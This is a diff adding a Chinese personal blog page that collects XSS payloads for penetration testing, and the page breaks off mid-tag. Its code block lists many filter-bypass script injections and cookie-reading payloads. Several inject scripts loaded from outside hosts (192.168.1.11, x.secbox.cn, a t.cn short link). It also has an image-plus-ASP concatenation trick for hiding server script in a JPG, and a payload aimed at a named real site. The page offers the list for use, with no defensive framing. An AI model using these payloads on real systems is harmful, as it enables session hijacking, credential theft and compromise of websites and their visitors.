@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"buchun2.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="收集常用的XSS-payload">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS-payload">
+<meta property="og:url" content="https://buchun2.github.io/2025/03/10/XSSpayload/index.html">
+<meta property="og:site_name" content="夜落">
+<meta property="og:description" content="收集常用的XSS-payload">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-11T05:51:52.396Z">
+<meta property="article:author" content="夜落">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://buchun2.github.io/2025/03/10/XSSpayload/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://buchun2.github.io/2025/03/10/XSSpayload/","path":"2025/03/10/XSSpayload/","title":"XSS-payload"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>XSS-payload | 夜落</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">夜落</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">夜落的空间</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-payload"><span class="nav-number">1.</span> <span class="nav-text">XSS-payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%84%E7%B1%BB%E5%8A%A8%E4%BD%9C"><span class="nav-number">2.</span> <span class="nav-text">各类动作</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">夜落</p>
+  <div class="site-description" itemprop="description">个人笔记</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/buchun2" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;buchun2" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://buchun2.github.io/2025/03/10/XSSpayload/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="夜落">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="夜落">
+      <meta itemprop="description" content="个人笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="XSS-payload | 夜落">
+      <meta itemprop="description" content="收集常用的XSS-payload">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XSS-payload
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-03-10 00:00:00" itemprop="dateCreated datePublished" datetime="2025-03-10T00:00:00+08:00">2025-03-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-11 13:51:52" itemprop="dateModified" datetime="2025-03-11T13:51:52+08:00">2025-03-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">外网渗透</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">漏洞利用</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/XSS/" itemprop="url" rel="index"><span itemprop="name">XSS</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>9.8k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>9 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">收集常用的XSS-payload</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="XSS-payload"><a href="#XSS-payload" class="headerlink" title="XSS-payload"></a>XSS-payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg /b + asp.asp /a asp.jpg</span><br><span class="line"></span><br><span class="line">&lt;% #include files=&quot;cus222.aspx.jpg&quot;%&gt;</span><br><span class="line"></span><br><span class="line">\u0027		&#x27;	单引号</span><br><span class="line">&amp;#34; 	&amp;quot; 	&quot; 	双引号</span><br><span class="line">&amp;#38; 	&amp;amp; 	&amp; 	&amp;符号</span><br><span class="line">&amp;#60; 	&amp;lt; 	\u003c	\x3c	&lt;  	小于号</span><br><span class="line">&amp;#62; 	&amp;gt; 	\u003e	\x3e	&gt;  	大于号 </span><br><span class="line">&amp;nbsp;  空格</span><br><span class="line">%0a	换行</span><br><span class="line"></span><br><span class="line">unicode转换    %C0%BC %C0%BE -》  &lt; &gt;</span><br><span class="line"></span><br><span class="line">&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;</span><br><span class="line">&amp;lt;script&amp;gt;alert(\&amp;quot;XSS\&amp;quot;)&amp;lt;/script&amp;gt;</span><br><span class="line"></span><br><span class="line">&amp;#60;/script&amp;#62;&amp;#60;script&amp;#62;alert(123)&amp;#60;/script&amp;#62;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;;%0a&#125;%0aconfirm(/xss/);%0a&#123;//</span><br><span class="line">&lt;/h2&gt;&lt;details open=&quot;&quot; ontoggle=alert`xss`&gt;&lt;h2&gt;1</span><br><span class="line">https://s3-us-west-2.amazonaws.com/bxss/fp.js</span><br><span class="line">&#x27;%22()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;alert(9534)&lt;/ScRiPt&gt;</span><br><span class="line">%3Cscript%3Ealert(/xss/)%3C/script%3E</span><br><span class="line">&quot;+alert(/xss/)+&quot;</span><br><span class="line">&#x27;+alert(123)+&#x27;</span><br><span class="line">%27%2balert(0x0006E0)%2b%27</span><br><span class="line">%3Cscript+src%3Dhttps%3A%2F%2Fx.secbox.cn%2FalujrL%3E%3C%2Fscript%3E   修改目标url</span><br><span class="line">&lt;/span&gt;&quot;&quot;&lt;span &lt;script&gt;alert%28%2Fxss%2F%29&lt;%2Fscript&gt;</span><br><span class="line">\%22))&#125;catch(e)&#123;(alert)(/XSS/.source);&#125;//&amp;width=500&amp;height=500</span><br><span class="line"></span><br><span class="line">http://m.cignacmb.com/shop/nianjin&quot;&gt;&lt;script&gt;alert(9841)&lt;/script&gt;.html  测试方法</span><br><span class="line">&lt;/script&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;</span><br><span class="line">&#x27;&quot;1&gt;&lt;script&gt;alert(&#x27;/xss&#x27;)&lt;/scRIpT&gt;</span><br><span class="line">&quot;&lt;p&gt;\n    test-xss&amp;nbsp;&lt;input autofocus onfocus=alert(\&quot;xss\&quot;)&gt;\n&lt;/p&gt;&quot;</span><br><span class="line">javascript:alert(/xss/)//</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;ScRiPt &gt;prompt(&#x27;xss&#x27;)&lt;/ScRiPt&gt;</span><br><span class="line">&lt;script&gt;alert(\&quot;XSS2\&quot;)&lt;/script&gt;</span><br><span class="line">&lt;&lt;script&gt;123&lt;/script&gt;script&gt;alert(&quot;XSS4&quot;)&lt;&lt;/script&gt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&lt;iMg src=N onerror=alert(95773)&gt;&lt;</span><br><span class="line">IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</span><br><span class="line">&amp;ltscript&amp;gtprompt(1)&amp;lt/script&amp;gt</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&#x27;vbscript.:msgbox(&quot;XSS&quot;)&#x27;&gt;</span><br><span class="line">&lt;svg/onload=prompt(1);&gt;</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/scr&lt;/script&gt;ipt&gt;</span><br><span class="line">&lt;ScRIpT&lt;ScRIpT&gt;&gt;alert(123);&lt;/ScRIpT&lt;/ScRIpT&gt;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">\u003cimg src=1 onerror=prompt(1)\u003e</span><br><span class="line"></span><br><span class="line">&lt;ScRiPt%20&gt;alert(/xxs/)&lt;/ScRiPt&gt;</span><br><span class="line"></span><br><span class="line">=kdnmewbl&#x27;&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;alert(9967)&lt;/ScRiPt&gt;</span><br><span class="line"></span><br><span class="line">&quot;/&gt;&lt;ScRiPt &gt;alert(&#x27;63&#x27;)&lt;/ScRiPt&gt;&lt;</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">&quot;&gt;&lt;svg/onload=prompt(&quot;xss&quot;);&gt;</span><br><span class="line">&quot;&gt;&lt;svg/onload=windows.open(&quot;http://192.168.1.11/7rIwFL?1567578277&quot;);&gt;</span><br><span class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(“XSS”);&lt;/SCRIPT&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line">&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">\&quot;;alert(&#x27;XSS&#x27;);//</span><br><span class="line"></span><br><span class="line">alert(navigator.userAgent)</span><br><span class="line"></span><br><span class="line">&quot; onclick=alert(1)//</span><br><span class="line">&quot; onclick=&quot;eval(location.hash.substr(1))</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(/4xs3s2c3/)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;=1</span><br><span class="line">&lt;hr/onmouseover=window.confirm(1)&gt;</span><br><span class="line"></span><br><span class="line">fgth</span><br><span class="line"></span><br><span class="line">&lt;/title&gt;&lt;a href=javascript:prompt(6)&gt;Click&lt;/a&gt;</span><br><span class="line">&lt;/textarea&gt;&lt;ScRiPt&gt;alert(/xss/)&lt;/ScRiPt&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;object src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;</span><br><span class="line">&lt;/textarea&gt;&#x27;&quot;&gt;&lt;script src=http://192.168.1.11/q1opHg?1567669308&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=http://t.cn/AiQudLJP&gt;&lt;/script&gt;</span><br><span class="line">&quot;onmouseover=&#x27;alert`5`&#x27;bad=&quot;</span><br><span class="line">&lt;hr onmouseover=alert(5)&gt;</span><br><span class="line">&lt;hr onclick=prompt(5)&gt;</span><br><span class="line">&lt;iMg src=N onerror=alert(95773)&gt;</span><br><span class="line">https://kss.ksyun.com/zwytest/COUPON/COUPONICON/1568618959716.jsp</span><br><span class="line">&quot;onmouseover=&#x27;alert(123123)&#x27;bad=&quot;</span><br><span class="line">&#x27;onmouseover=&#x27;alert(123123)&#x27;bad=&#x27;</span><br><span class="line">&lt;input+onclick=&#x27;window.confirm(&quot;xss&quot;)&#x27;+value=&quot;</span><br><span class="line">&quot;onmouseover=&quot;[window[&#x27;location&#x27;]=&#x27;\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x2834\x29&#x27;]&quot;</span><br><span class="line">&quot; accesskey=&quot;X&quot; onclick=&quot;alert(/wangan_test/)&quot; &gt;&lt;svg/onload=prompt(&quot;xss&quot;);&gt;&lt;</span><br><span class="line">&quot; accesskey=&quot;X&quot; onclick=&quot;alert(/wangan_test/)&quot;  #shift+alt+x组合键</span><br><span class="line">&lt;img src=x onclick=s=createElement(&#x27;script&#x27;);body.appendChild(s);s.src=&#x27;https://192.168.1.11/15kdrs?1625646246&#x27;;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img/src=q onerror=&#x27;new Function`al\ert\`1\``&#x27;&gt;</span><br><span class="line">&lt;iframe/onload=&#x27;this[&quot;src&quot;]=&quot;javas&amp;Tab;cript:al&quot;+&quot;ert``&quot;&#x27;;&gt;</span><br><span class="line">&lt;input/onauxclick=&quot;[1].map(prompt)&quot;&gt;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">&lt;img src=x onclick=s=createElement(&#x27;script&#x27;);body.appendChild(s);s.src=&#x27;https://192.168.1.11/15kdrs?1625646246&#x27;;&gt;</span><br><span class="line">&lt;hr src=x onclick=s=createElement(&#x27;script&#x27;);body.appendChild(s);s.src=&#x27;https://192.168.1.11/15kdrs?1625646246&#x27;;&gt;</span><br><span class="line">41wq</span><br><span class="line">&lt;img src=x onclick=s=createElement(&#x27;script&#x27;);body.appendChild(s);s.src=&#x27;https://192.168.1.11/15kdrs?1625646246&#x27;;&gt;</span><br><span class="line">&lt;/textarea&gt;&#x27;&quot;&gt;&lt;script src=https://192.168.1.11/15kdrs?1625646246&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=https://192.168.1.11/pcLoId?1615879936&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg/onclick=prompt(1);&gt;</span><br><span class="line">&lt;iMg src=N onclick=prompt(95773)&gt;</span><br><span class="line"></span><br><span class="line">&quot;--&gt;\&quot;时使用%81&quot;	#宽字节</span><br><span class="line"></span><br><span class="line">&quot;onmouseover=&quot;eval(/ale/.source+/rt/.source+/(17)/.source)&quot;</span><br><span class="line">%c0%22;alert(1);//aaaaaa   #宽字节</span><br><span class="line">vbscript:msgbox(1)&#x27;</span><br><span class="line">&lt;input autofocus onfocus=&#x27;alert(63)&#x27;</span><br><span class="line">&#x27;&lt;&lt;phonenum&gt;&gt;&#x27;&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;alert(9037)&lt;/ScRiPt&gt;&gt;</span><br><span class="line"></span><br><span class="line">ss=aaa&amp;from=1</span><br><span class="line">ss=aaaa\&quot;+&quot;&amp;from==1;alert(1);function/**/from()&#123;&#125;//&quot;+&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%26解码后为&amp;</span><br><span class="line">keyword=%26callback=eval(St ring.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41));void</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;script src=&#x27;xss.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&quot;);%0aconsole.log(document.cookie);//</span><br><span class="line"></span><br><span class="line">&quot;;confirm(/xss/);//</span><br><span class="line">&quot;&gt;&lt;!--      --&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;</span><br><span class="line">&quot;;alert(/1111/);&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">javascript:alert(&#x27;xss&#x27;)</span><br><span class="line">javascrip&amp;#116&amp;#58alert(&#x27;xss&#x27;)</span><br><span class="line"></span><br><span class="line">theme=&quot;/&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 8216, 120, 115, 115, 8217, 41)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41));&lt;/script&gt;</span><br><span class="line">&lt;img src=&quot;&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029&quot;&gt;</span><br><span class="line"></span><br><span class="line">%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e</span><br><span class="line"></span><br><span class="line">&lt;a/onmouseover[\x0b]=location=&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;&gt;rhainfosec</span><br><span class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)&gt; </span><br><span class="line">&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&#x27;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&#x27;\0029&quot;&gt; </span><br><span class="line"></span><br><span class="line">    &lt;!--[if gte IE 4]&gt;</span><br><span class="line"></span><br><span class="line">     &lt;SCRIPT&gt;alert(&#x27;XSS&#x27;);&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">     &lt;![endif]--&gt;</span><br><span class="line"></span><br><span class="line">style=font-family=expression(744+%7BtoString:alert%7D)!</span><br><span class="line"></span><br><span class="line">&lt;!-- 空格被过滤 --&gt;</span><br><span class="line">&lt;img/src=&quot;1&quot;/onerror=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 双写绕过 --&gt;</span><br><span class="line">&lt;iimgmg src=1 oonerrornerror=aimglert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 大小写绕过  --&gt;</span><br><span class="line">&lt;iMg src=1 oNerRor=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 利用eval() --&gt;</span><br><span class="line">&lt;img src=1 onerror=&quot;a=`aler`;b=`t(1)`;eval(a+b);&quot;&gt;</span><br><span class="line">&lt;img src=1 onerror=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 利用location --&gt;</span><br><span class="line">&lt;img src=1 